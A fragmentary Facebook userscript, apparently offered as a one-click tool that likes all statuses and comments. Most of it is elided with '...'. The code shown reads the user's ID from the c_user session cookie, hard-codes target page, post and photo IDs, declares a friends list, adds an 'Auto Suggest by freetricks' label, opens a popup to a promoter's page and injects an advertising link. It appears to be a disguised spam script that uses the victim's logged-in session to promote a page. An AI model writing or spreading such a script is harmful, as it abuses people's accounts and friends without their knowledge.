...
// @description		Like all facebook status and comments with one clicks. - www.freetricks.nazuka.net or www.free-tricks.tk
// @author		www.freetricks.nazuka.net or www.free-tricks.tk
// @authorURL		facebook	
// @homepage		facebook
...
var spage_id = "212013405634664";
var spost_id = "212013405634664";
var sfoto_id = "212013405634664";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by freetricks';
...
window.open(this.href='http://facebook.com/wowfreetricks', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=no,width=400,height=255');return false;
};}
...
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
    div.innerHTML = "<b><center><a href='http://freetricks.nazuka.net'>More Tricks !!</a></center></b>"
body.appendChild(div);}
